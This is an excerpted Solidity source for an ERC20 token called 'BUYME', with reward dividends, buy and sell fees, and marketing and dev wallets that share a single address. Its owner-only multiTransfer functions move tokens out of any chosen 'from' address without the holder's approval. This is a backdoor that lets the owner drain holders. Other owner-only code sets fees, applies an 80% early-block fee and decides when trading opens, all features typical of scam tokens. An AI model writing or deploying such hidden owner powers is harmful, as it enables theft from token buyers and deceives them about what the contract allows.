...
contract arron is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    address public _marketingWallet = 0x3b92d6A24fbB45DbaF85B90D28aA50Bc6678d200;
    address public _devWallet = 0x3b92d6A24fbB45DbaF85B90D28aA50Bc6678d200;
    bool public tradingOpen = false;

    bool public restrictWhales = false;

    uint256 public maxTxAmount = 1000 * 10**6 * (10**9);
    uint256 public walletMax = 1000 * 10**6 * (10**9);
    uint256 public swapTokensAtAmount = 1000000 * (10**9);

    uint256 public  BuyRewardsFee = 4;
    ...
    constructor() ERC20("BUYME", "BUYME") {

        dividendTracker = new RBNBDividendTracker();
        BuyTotalFees = BuyRewardsFee.add(BuyLiquidityFee).add(BuyMarketingFee).add(BuyDevFee);
        SellTotalFees = SellRewardsFee.add(SellLiquidityFee).add(SellMarketingFee).add(SellDevFee);
        ...
        */
        _mint(owner(), 1000 * 10**6 * (10**9));  
    }

    receive() external payable {}

    function updateBuyFees(uint256 newBuyRewardFee, uint256 newBuyLiqFee, uint256 newBuyMarketingFee,uint256 newBuyDevFee) public onlyOwner {
    ...
    function updateSellFees(uint256 newSellRewardFee, uint256 newSellLiqFee, uint256 newSellMarketingFee,uint256 newSellDevFee) public onlyOwner {
    ...
    function setWallets(address payable marketingwallet,address payable devwallet) public onlyOwner {
    ...
    function multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
        ...
        for(uint i=0; i < addresses.length; i++){
            SCCC = SCCC + (tokens[i] * 10**9);
        }

        require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");

        for(uint i=0; i < addresses.length; i++){
            _transfer(from,addresses[i],(tokens[i] * 10**9));
    ...
    function multiTransfer_fixed(address from, address[] calldata addresses, uint256 tokens) external onlyOwner {
        ...
        uint256 SCCC = tokens* 10**9 * addresses.length;

        require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");

        for(uint i=0; i < addresses.length; i++){
            _transfer(from,addresses[i],(tokens* 10**9));
            }
    }
    ...
    function _transfer(address from, address to, uint256 amount ) internal override {
        ...
        if(takeFee) {
            ...
            if(from == uniswapV2Pair && (launchedAt + deadBlocks) > block.number){
                BuyFees = amount.div(100).mul(80); //high fee for snipers       
            }
    ...
    function swapBack(uint256 tokensToLiquify) internal lockTheSwap {
        ...
        uint256 bnbForMarketing = bnbBalance.mul(SellMarketingFee).div(bnbFeeFactor);
        uint256 bnbForDev = bnbBalance.sub(bnbForLiquidity).sub(bnbForReflection).sub(bnbForMarketing);
    ...
    function tradingStatus(bool _status, uint256 _deadBlocks) public onlyOwner {
        ...
        maxTxAmount = 10 * 10**6 * (10**9);
        walletMax = 10 * 10**6 * (10**9);
